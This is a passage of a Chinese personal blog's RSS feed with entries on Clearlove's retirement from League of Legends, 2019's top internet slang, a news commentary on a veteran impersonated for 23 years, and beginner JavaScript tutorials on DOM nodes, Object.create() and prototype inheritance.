data-original="https://pic1.zhimg.com/v2-b076c5b75bf8ed1e4f31c79ca1a5375a_r.jpg" data-src="https://pic1.zhimg.com/50/v2-b076c5b75bf8ed1e4f31c79ca1a5375a_hd.jpg">&emsp;&emsp;去年S赛小IG拿了LPL第一个全球总决赛冠军，七年磨一剑，无数玩家喜极而泣。明凯发微博，“舞台下，也许更能看清前方的道路。”曾经的口嗨让梦想打野退役，差点如愿以偿，我却开始希望他不要走。尽吾志也而不能至者，可以无悔矣，其孰能讥之乎？他真的在意的是钱吗，众所周知，以诺言的人气和影响力，退役直播大概率并不会低于他的现在收入。<img data-rawwidth="1080" data-rawheight="2090" data-size="normal" data-default-watermark-src="https://pic4.zhimg.com/50/v2-c52402e6cb29d9dff3c3c25e8af4f136_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1080" data-original="https://pic3.zhimg.com/v2-33021b502869b562d9abadf8fd1296a4_r.jpg" data-src="https://pic3.zhimg.com/50/v2-33021b502869b562d9abadf8fd1296a4_hd.jpg">&emsp;&emsp;诺言已经一年没上过场了，这个曾经站在世界之巅的男人，爱他的恨他的都拿着放大镜看他。最终对他也越来越宽容了。微博年度超话明凯排名第六，超过李现和迪丽热巴。在他之前的两名选手，一位是LPL台柱子UZI，一位是现象级选手TheShy。可遗憾无法被怜悯和施舍弥补，曾经的英雄一次次带着血和灰爬起来，却最终不得不妥协，那么多年盼望的神之位的奖杯，是属于年轻人的。S7EDG输了，无数粉丝在现场泣不成声。24岁的明凯坐在那里，看着EDG的光芒逐渐暗淡，满眼都是金色的雨。<img data-rawwidth="587" data-rawheight="391" data-size="normal" data-default-watermark-src="https://pic2.zhimg.com/50/v2-16df45cb9a344f3de2661673e94c54aa_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="587" data-original="https://pic2.zhimg.com/v2-2d7e53d585c720f0bbac800fe7f2093d_r.jpg" data-src="https://pic2.zhimg.com/50/v2-2d7e53d585c720f0bbac800fe7f2093d_hd.jpg">&emsp;&emsp;我看到一位女粉丝，她声嘶力竭地在现场喊——“明凯，你别在意”时至今日，我也想再一次为赛场上的明凯喊出这句话。“守护全世界最好的诺言”，守护的是那段在屏幕前赛场下，屏息凝视，欢呼雀跃，沉默不语的青春岁月。江湖终不似我来时。FPX.tian，因为看了明凯msi夺冠后投入电竞事业，明凯是天的职业偶像。一个最早的世界赛双冠打野，感召粉丝进入职业，进入lpl并为lpl拿下第二个冠军，巩固第一赛区的地位，而这位粉丝也是S赛的fmvp。薪火相传，天下没有不散的筵席。每位选手都会迎来退役的那天，每位职业都有生涯的昨天与今天，只是可能不再有明天，但是LPL，一直有明天。德杯将会是明凯的第一次BP，S10世界赛在中国举办，明凯将以新的身份带领队员。传奇永不灭，又将有无数的新星挑战神位，也可能会有新王崛起，这就是我们所热爱的LOL，残酷而热烈。少年啊少年，你又将为谁而哭泣呢？尽管结果不尽人意，却依然拼尽了全力。不要在意，继续走下去，陪这个游戏，这个赛场，走到你们力所能及的地方吧。<img data-rawwidth="1080" data-rawheight="1620" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-e88e40062386c12867a1404ab4d0604d_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1080" data-original="https://pic1.zhimg.com/v2-1d9a4f25050b9f2b4e982c2c659ad652_r.jpg" data-src="https://pic1.zhimg.com/50/v2-1d9a4f25050b9f2b4e982c2c659ad652_hd.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;


&lt;h1 id=&quot;EDG-官宣-Clearlove（明凯）正式退役成为教练，你有什么想说的？&quot;&gt;&lt;a href=&quot;#EDG-官宣-Clearlove（明凯）正式退
      
    
    </summary>
    
    
      <category term="吹牛逼" scheme="https://www.nikoyu.asia/categories/%E5%90%B9%E7%89%9B%E9%80%BC/"/>
    
    
      <category term="LOL" scheme="https://www.nikoyu.asia/tags/LOL/"/>
    
      <category term="英雄联盟" scheme="https://www.nikoyu.asia/tags/%E8%8B%B1%E9%9B%84%E8%81%94%E7%9B%9F/"/>
    
  </entry>
  
  <entry>
    <title>2019年十大网络用语发布</title>
    <link href="https://www.nikoyu.asia/net-word.html"/>
    <id>https://www.nikoyu.asia/net-word.html</id>
    <published>2019-12-10T15:21:00.000Z</published>
    <updated>2020-09-17T03:20:45.604Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><img alt="社会" class="thumb lazyload" data-src="https://www.williamlong.info/logo/Society.gif"><p>　　12月2日，据教育部官网显示，国家语言资源监测与研究中心发布了“2019年度十大网络用语”。本次发布的十个网络用语依次为：不忘初心；道路千万条，安全第一条；柠檬精；好嗨哟；是个狼人；雨女无瓜；硬核；996；14亿护旗手；断舍离。</p><p>　　据悉，“2019年十大网络用语”是基于国家语言资源监测语料库（网络媒体部分），采用“以智能信息处理技术为主，以人工后期微调为辅”的方式提取获得的。监测语料库包含了代表性网络论坛、网络新闻、博客等不同媒体形式的海量年度语言资源，用数据反映了年度流行网络用语的使用情况。其中，本次发布所涉及的网络论坛部分的数据就包含了超过40万个帖子，字符数超过5亿。</p><p>　　“2019年十大网络用语”解读</p><p>　　一、不忘初心</p><p>　　意思是不忘记最初的心愿。习近平总书记在党的十九大报告中庄严宣告：“中国共产党人的初心和使命，就是为中国人民谋幸福，为中华民族谋复兴。”其实，每个人都有一颗初心的种子，都应当寻找初心、牢记初心、保持初心，为实现自己的小目标努力奋斗，为实现中国梦添砖加瓦。</p><p>　　二、道路千万条，安全第一条</p><p>　　此语的流行源于电影《流浪地球》中反复使用的一句台词，后被多地交警作为交通安全宣传用语采用。网友仿照该句式创造出多种“××千万条，××第一条”的用法，使这一网络用语得到了更广泛的使用和传播。</p><p>　　三、柠檬精</p><p>　　字面意思是柠檬成精，指很喜欢酸别人，嫉妒别人。现多用于自嘲式地表达对他人从外貌到内在、从物质生活到情感生活的多重羡慕。</p><p>　　四、好嗨哟</p><p>　　来源于同名网络歌曲，经过短视频达人改编并配合十分魔性的表演，引得许多人模仿，用于表达很高兴和兴奋的状态。</p><p>　　五、是个狼人</p><p>　　由“是个狠人”演变而来的，意思是“比狠人再狠‘一点’”。通常用来调侃某人做事不按常理出牌，却又能取得奇效，给人一种出乎意外的很厉害的感觉。</p><p>　　六、雨女无瓜</p><p>　　“与你无关”的谐音，是一种普通话不标准、带有方言腔的表达。这种表达看起来高冷神秘，有点让人摸不着头脑，再加上表情包显得十分逗趣，通常用于回怼或调侃别人。</p><p>　　七、硬核</p><p>　　该词最早指说唱音乐的一种形式，被认为更具有力量感。后引申为“核心部分、中坚分子”，有厉害、霸气之义。如硬核技术指很关键、很核心的技术；说某人很硬核可以指对方很强硬、很彪悍。</p><p>　　八、996</p><p>　　指工作时间从早上9点到晚上9点，一周工作6天，代表着中国互联网企业盛行的加班文化。但崇尚奋斗、崇尚劳动不等于强制加班。苦干是奋斗，巧干也是奋斗；延长工时是奋斗，提高效率也是奋斗。</p><p>　　九、14亿护旗手</p><p>　　面对有暴徒在香港把国旗丢进海中的暴行，央视新闻当天发布微博话题“五星红旗有14亿护旗手”并置顶，网友们纷纷留言、刷屏转发，表达热爱祖国、护卫国旗的真挚感情。</p><p>　　十、断舍离</p><p>　　一种生活态度，意思是把那些不必需、不合适、过时的东西统统断绝、舍弃，并切断对它们的眷恋，“断舍离”之后才能过简单清爽的生活。</p><p>2019年十大网络用语发布<br><img alt="2019年十大网络用语发布" data-src="https://www.williamlong.info/logo/Society.jpg" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;img alt=&quot;社会&quot; class=&quot;thumb lazyload&quot; data-src=&quot;https://www.williamlong.info/logo/
      
    
    </summary>
    
    
      <category term="吹牛逼" scheme="https://www.nikoyu.asia/categories/%E5%90%B9%E7%89%9B%E9%80%BC/"/>
    
    
      <category term="news" scheme="https://www.nikoyu.asia/tags/news/"/>
    
  </entry>
  
  <entry>
    <title>退伍军人被顶替</title>
    <link href="https://www.nikoyu.asia/%E9%80%80%E4%BC%8D%E5%86%9B%E4%BA%BA%E8%A2%AB%E9%A1%B6%E6%9B%BF.html"/>
    <id>https://www.nikoyu.asia/%E9%80%80%E4%BC%8D%E5%86%9B%E4%BA%BA%E8%A2%AB%E9%A1%B6%E6%9B%BF.html</id>
    <published>2019-12-06T07:28:41.000Z</published>
    <updated>2020-09-17T03:20:45.608Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="退伍军人被顶替23年：地方能人一手操办之风可休矣"><a href="#退伍军人被顶替23年：地方能人一手操办之风可休矣" class="headerlink" title="退伍军人被顶替23年：地方能人一手操办之风可休矣"></a>退伍军人被顶替23年：地方能人一手操办之风可休矣</h1><div id="left-container" class="left-container"><div class="item-wrap"><div class="article " id="article" data-islow-browser="0"><div class="article-content"><div class="img-container"><img class="large lazyload" data-loadfunc="0" data-loaded="0" data-src="http://pics2.baidu.com/feed/1c950a7b02087bf4bdad20e2bd968c2910dfcfc7.png?token=b5d6c83e879ea258426889a2554900af&amp;s=B3B178855E6600091080B90A0300A091"></div><p><span class="bjh-p">资料图 来源：新京报我们视频</span></p><p><span class="bjh-p">李逵再遇李鬼，只不过这次不是冒名顶替上大学。日前，河南周口47岁的退伍军人仵瑞华无意中发现自己在23年前就被人冒名以退伍军人身份享受安置待遇，冒名者现为当地某镇政府工作人员，每月工资3489元。截至目前，当地已就此事成立专项调查组介入，同时表态称“无论牵涉到谁，都将严肃处理，绝不姑息”，涉事人员亦被警方控制并接受问询。</span></p><p><span class="bjh-p">现正经营一家小装修公司的被顶替者仵瑞华，过去一个多月时间都沉浸和奔波于这桩被冒名顶替的申诉中，其现在的收入与冒名者的收入比，可能并不低，甚至外界会对此有所谓“值不值”的评价和议论。但对当事者而言，这从一开始就不是(或者说不仅是)一个23年经济收入损失的问题，而事关一个人的工作机会、职业规划和抱负(因为被冒名顶替的事，勾起了当事人对年少时志向的想法)，于个人而言涉及到最基本的公平和权利，以政府人事管理而论，更攸关人事管理流程与制度的严肃性，以及基层权力涉嫌的寻租与渎职。</span></p><p><span class="bjh-p">一桩退伍军人被冒名事件，因一次信息的主动公开而发端，更因相关情况被公之于众而成为舆论热议焦点，由此也可看到<span class="bjh-strong">公开对于权力监督的价值和意义。</span>正是当事人在散步中无意发现的一份“退伍军人安置名单”，牵出了23年前的冒名顶替上班旧事，也是因为信息公开后的被聚焦和广泛传播，才推动了个案内情的被调查，而不是循着当地一开始所谓“不闹僵”的劝解思路进行。<span class="bjh-strong">公开之于监督的意义不可低估，哪怕只是一份年代久远的普通名单或者账目，都可能为公众勾勒一幅彼时基层权力运行的真实图景。</span></span></p><p><span class="bjh-p">1996年的冒名顶替案，现在看来确实属于陈年旧账，甚至以现在的眼光、性价比去判断，对很多人来说可能都早已“不值一提”。但回到事发当时的基层权力运行真实状态，一位退伍军人被冒名安置或者一个高考学生被顶替上大学，<span class="bjh-strong">类似的权力寻租和操作难度在当地的现实政治环境中，都可能注定会是考验某个“能人”或者某个“能量”家族综合实力的关键时刻。</span>一次现在看来常规化的普通信息公开操作，当事人的姓名、服役信息乃至全套档案资料被发现和冒用，需要打通的关节自不会少，参与或者起码默许此类违规操作的公职人员是否会受到彻查和追究，公众与当事人一样拭目以待。</span></p><p><span class="bjh-p">好在时过境迁，彼时有能量在当地呼风唤雨的责任人，现在可能多已失去干扰和妨碍调查的能力，这对彻查陈年旧案来说堪称利好。但在事件未进入舆论前的当地反应，对被冒名者想深究的举动不乏泼冷水者，很难去判断这是基于对陈年旧案复杂情况的逃避，还是对到目前为止仍隐于幕后的“能人”的袒护。<span class="bjh-strong">无论如何这都不是政务服务该有的态度和做派，只会让权利被侵害者更加寒心，也让违规者继续坐享彼时侵夺而来的利益，得不到应有的问责和惩罚。</span>既然当地有关部门已有“顶替者亲属一手操办”的认定，那么对于“一手操办”有关的诸多环节、一应责任人，都应当有彻底的调查和梳理。</span></p><p><span class="bjh-p"><span class="bjh-strong">人事管理的陈年旧账不能一直被容忍而不清理和清查，此番靠信息公开意外“收获”的权力违规滥用的线索有必要被深究。</span>不光是要给合法权益和机会被侵夺23年的当事人一个最基本的交待，更要以此为契机，对正在逐步完善的基层人事管理制度做对照性筛查。</span></p><p><span class="bjh-p">冒名顶替的陈年旧事，要给即便在当下也时不时会发生的地方机关事业单位“萝卜招考招聘”再敲一次警钟：<span class="bjh-strong">伸手必被捉，可能只是时间早晚问题。</span><span class="bjh-strong">时代在发展，制度和技术终将趋于严密，社会对基层权力寻租的容忍度也随之不断降低。</span>特别是随着信息公开范围与实践的扩大，彼时的权力违规操作，哪怕当时多么天衣无缝，都难免在不经意中被扯出来，甚至“拔出萝卜带出泥”，<span class="bjh-strong">这是权力现代化转型的一个副产品，给社会公共治理不断带来小惊喜。</span></span></p><p><span class="bjh-br"></span>(来源:南方都市报)</p></div><audio height="0" width="0" id="musicAudio" data-play-index><source></audio></div></div></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;退伍军人被顶替23年：地方能人一手操办之风可休矣&quot;&gt;&lt;a href=&quot;#退伍军人被顶替23年：地方能人一手操办之风可休矣&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="新闻" scheme="https://www.nikoyu.asia/categories/%E6%96%B0%E9%97%BB/"/>
    
    
      <category term="news" scheme="https://www.nikoyu.asia/tags/news/"/>
    
  </entry>
  
  <entry>
    <title>原生js节点操作</title>
    <link href="https://www.nikoyu.asia/%E5%8E%9F%E7%94%9Fjs%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C.html"/>
    <id>https://www.nikoyu.asia/%E5%8E%9F%E7%94%9Fjs%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C.html</id>
    <published>2019-12-04T07:06:27.000Z</published>
    <updated>2020-09-17T03:20:45.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原生js节点操作"><a href="#原生js节点操作" class="headerlink" title="原生js节点操作"></a>原生js节点操作</h1><h2 id="节点属性值"><a href="#节点属性值" class="headerlink" title="节点属性值"></a>节点属性值</h2><p>1 获取上级节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Node.parentNode     &#x2F;&#x2F;返回父节点</span><br><span class="line">Node.ownerDocument  &#x2F;&#x2F;返回祖先节点</span><br></pre></td></tr></table></figure><p>2 获取下级节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node.childNodes     &#x2F;&#x2F;返回相邻后代的元素节点和文本节点对象的集合(换行算作文本节点)</span><br><span class="line">Node.children       &#x2F;&#x2F;返回相邻后代的元素节点集合</span><br><span class="line">Node.firstChild     &#x2F;&#x2F;返回相邻后代第一个的元素节点</span><br><span class="line">Node.lastChild      &#x2F;&#x2F;返回相邻后代最后一个的元素节点</span><br></pre></td></tr></table></figure><p>3 获取同级节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Node.previousSibling   &#x2F;&#x2F; 返回前一个节点</span><br><span class="line">Node.nextSibling       &#x2F;&#x2F; 返回后一个节点</span><br></pre></td></tr></table></figure><h2 id="节点方法"><a href="#节点方法" class="headerlink" title="节点方法"></a>节点方法</h2><p>1 创建</p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.createElement(&#39;li&#39;)           &#x2F;&#x2F;创建元素节点</span><br><span class="line">document.createAttribute(&quot;class&quot;)      &#x2F;&#x2F;创建属性节点</span><br><span class="line">document.createTextNode(&quot;Hello World&quot;) &#x2F;&#x2F;创建文本节点</span><br></pre></td></tr></table></figure><p>2 复制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var newNode&#x3D;Node.cloneNode(Boolean)    </span><br><span class="line">&#x2F;&#x2F;Boolean:true  返回Node及其全部子孙节点</span><br><span class="line">&#x2F;&#x2F;Boolean:false 只返回Node节点</span><br></pre></td></tr></table></figure><p>3 增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parentNode.appendChild(newNode)     &#x2F;&#x2F;增加节点至子节点末尾</span><br><span class="line">parentNode.insertBefore(newNode,targetNode)   &#x2F;&#x2F;增加节点至targetNode之前</span><br><span class="line">parentNode.innerHTML+&#x3D;&#39;&lt;li&gt;&lt;&#x2F;li&gt;&#39;   &#x2F;&#x2F;增加元素节点至子节点末尾</span><br><span class="line">parentNode.innerText+&#x3D;&#39;Hello World&#39; &#x2F;&#x2F;增加文本节点至子节点末尾</span><br></pre></td></tr></table></figure><p>4 删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parentNode.removeChild(childNode)     &#x2F;&#x2F;已知父节点</span><br><span class="line">node.parentNode.removeChild(childNod) &#x2F;&#x2F;未知父节点</span><br></pre></td></tr></table></figure><p>5 获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById()</span><br><span class="line">document.getElementsByClassName()</span><br><span class="line">document.getElementsByTagName()  </span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原生js节点操作&quot;&gt;&lt;a href=&quot;#原生js节点操作&quot; class=&quot;headerlink&quot; title=&quot;原生js节点操作&quot;&gt;&lt;/a&gt;原生js节点操作&lt;/h1&gt;&lt;h2 id=&quot;节点属性值&quot;&gt;&lt;a href=&quot;#节点属性值&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="js" scheme="https://www.nikoyu.asia/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>javascript Object.create()函数</title>
    <link href="https://www.nikoyu.asia/javascript-Object-create-%E5%87%BD%E6%95%B0.html"/>
    <id>https://www.nikoyu.asia/javascript-Object-create-%E5%87%BD%E6%95%B0.html</id>
    <published>2019-12-04T07:02:15.000Z</published>
    <updated>2020-09-17T03:20:45.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="javascript-Object-create-函数"><a href="#javascript-Object-create-函数" class="headerlink" title="javascript Object.create()函数"></a>javascript Object.create()函数</h1><p>Object.create() 方法会使用指定的原型对象及其属性去创建一个新的对象。 <br><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.create(proto, [ propertiesObject ])</span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proto</span><br><span class="line">一个对象，应该是新创建的对象的原型。</span><br><span class="line">propertiesObject</span><br><span class="line">可选。该参数对象是一组属性与值，该对象的属性名称将是新创建的对象的属性名称，值是属性描述符</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="测试-lt"><a href="#测试-lt" class="headerlink" title="测试&lt;"></a>测试&lt;</h2><p>1参数proto为原型对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;实现继承</span><br><span class="line">function Father()&#123;&#125;</span><br><span class="line">function Child()&#123;&#125;</span><br><span class="line">Child.prototype&#x3D;Object.create(Father.prototype);</span><br><span class="line">console.log(Child.prototype.__proto__&#x3D;&#x3D;&#x3D;Father.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(Child.__proto__&#x3D;&#x3D;&#x3D;Father.__proto__)&#x2F;&#x2F;true</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">function A()&#123;&#125;</span><br><span class="line">var a&#x3D;Object.create(A.prototype);&#x2F;&#x2F;无prototype属性</span><br><span class="line">console.log(a.__proto__&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>2参数proto为函数对象 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function A()&#123;&#125;</span><br><span class="line">var a1&#x3D;Object.create(A)&#x2F;&#x2F;有prototype属性</span><br><span class="line">console.log(a1.prototype&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(a1.__proto__&#x3D;&#x3D;&#x3D;A)&#x2F;&#x2F;true</span><br><span class="line">&#x2F;&#x2F;对比</span><br><span class="line">var a2&#x3D;new A();&#x2F;&#x2F;无prototype属性</span><br><span class="line">console.log(a2.__proto__&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3参数proto为函数实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function A()&#123;&#125;</span><br><span class="line">var A1&#x3D;new A();</span><br><span class="line">var a&#x3D;Object.create(A1);&#x2F;&#x2F;无prototype属性</span><br><span class="line">console.log(a.__proto__&#x3D;&#x3D;&#x3D;A1)&#x2F;&#x2F;true</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;javascript-Object-create-函数&quot;&gt;&lt;a href=&quot;#javascript-Object-create-函数&quot; class=&quot;headerlink&quot; title=&quot;javascript Object.create()函数&quot;&gt;&lt;/a&gt;java
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="js" scheme="https://www.nikoyu.asia/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>js 原型继承分析</title>
    <link href="https://www.nikoyu.asia/js-%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF%E5%88%86%E6%9E%90.html"/>
    <id>https://www.nikoyu.asia/js-%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF%E5%88%86%E6%9E%90.html</id>
    <published>2019-12-04T06:31:09.000Z</published>
    <updated>2020-09-17T03:20:45.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="js-原型继承分析"><a href="#js-原型继承分析" class="headerlink" title="js 原型继承分析"></a>js 原型继承分析</h1><h2 id="1、继承上下文"><a href="#1、继承上下文" class="headerlink" title="1、继承上下文"></a>1、继承上下文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;人</span><br><span class="line">function Person(lastname,firstname,gender)&#123;</span><br><span class="line">    this.lastname&#x3D;lastname;</span><br><span class="line">    this.firstname&#x3D;firstname;</span><br><span class="line">    this.gender&#x3D;gender;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;作家</span><br><span class="line">function Writer(lastname,firstname,gender,worksname)&#123;</span><br><span class="line">    this.worksname&#x3D;worksname;</span><br><span class="line">    Person.apply(this,arguments);&#x2F;&#x2F;继承人类的上下文</span><br><span class="line">    &#x2F;&#x2F;Person.apply(this,lastname,firstname,gender);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;给作家添加原型方法</span><br><span class="line">Writer.prototype.introduce&#x3D;function()&#123;</span><br><span class="line">    console.log(&#39;我叫 %s %s \n性别 %s \n我的成名作是 %s&#39;,this.lastname,this.firstname,this.gender,this.worksname);</span><br><span class="line">    &#125;</span><br><span class="line">&#x2F;&#x2F;实例化作家苏洵</span><br><span class="line">var writer&#x3D;new Writer(&#39;苏&#39;,&#39;洵&#39;,&#39;mela&#39;,&#39;六国论&#39;);</span><br><span class="line">writer.introduce();</span><br><span class="line">&#x2F;*我叫 苏 洵 </span><br><span class="line">  性别 mela </span><br><span class="line">  我的成名作是 六国论*&#x2F;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2、继承原型"><a href="#2、继承原型" class="headerlink" title="2、继承原型"></a>2、继承原型</h2><p>关于原型、原型链不了解可以戳这  <a href="https://nikoyu.asia/JS-原型、原型链、构造器关系.html" rel="nofollow" target="_blank"><strong>js 原型、原型链、构造器关系</strong></a></p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;人</span><br><span class="line">function Person(lastname,firstname,gender)&#123;</span><br><span class="line">    this.lastname&#x3D;lastname;</span><br><span class="line">    this.firstname&#x3D;firstname;</span><br><span class="line">    this.gender&#x3D;gender;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype&#x3D;&#123;</span><br><span class="line">    constructor:Person,</span><br><span class="line">    eat()&#123;</span><br><span class="line">        console.log(&#39;我饿了需要吃饭&#39;);</span><br><span class="line">    &#125;,</span><br><span class="line">    breathe()&#123;</span><br><span class="line">        console.log(&#39;我不呼吸会死的&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;作家</span><br><span class="line">function Writer(lastname,firstname,gender,worksname)&#123;</span><br><span class="line">    this.worksname&#x3D;worksname;</span><br><span class="line">    Person.apply(this,arguments);&#x2F;&#x2F;继承人类的上下文</span><br><span class="line">    &#x2F;&#x2F;Person.apply(this,lastname,firstname,gender);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;原型继承</span><br><span class="line">Writer.prototype&#x3D;new Person();</span><br><span class="line">&#x2F;&#x2F;或者Writer.prototype&#x3D;Object.create(Person.prototype);</span><br><span class="line">Writer.prototype.constructor&#x3D;Writer;</span><br><span class="line">Writer.prototype.introduce&#x3D;function()&#123;</span><br><span class="line">    console.log(&#39;我叫 %s %s \n性别 %s \n我的成名作是 %s&#39;,this.lastname,this.firstname,this.gender,this.worksname);</span><br><span class="line">    &#125;</span><br><span class="line">Writer.prototype.init&#x3D;&#39;老子可是笔下生花的作家呀&#39;;</span><br><span class="line">var writer&#x3D;new Writer(&#39;苏&#39;,&#39;洵&#39;,&#39;mela&#39;,&#39;六国论&#39;);</span><br><span class="line">writer.eat()&#x2F;&#x2F;我饿了需要吃饭</span><br><span class="line">writer.breathe()&#x2F;&#x2F;我不呼吸会死的</span><br><span class="line">writer.introduce()&#x2F;*我叫 苏 洵 </span><br><span class="line">                    性别 mela </span><br><span class="line">                   我的成名作是 六国论*&#x2F;</span><br><span class="line">console.log(writer.init)&#x2F;&#x2F;&quot;老子可是笔下生花的作家呀&quot;</span><br></pre></td></tr></table></figure><p>分析：<strong><code>Writer.prototype=new Person()</code></strong></p><p>这句代码让Write的原型成为Person的一个实例，而new Person()的原型链(__proto__)指向Person的原型(prototype)，所以有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Writer.prototype.__proto__&#x3D;&#x3D;&#x3D;Person.prototype&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>再看看此时Writer的原型</p><p><img alt="这里写图片描述" title 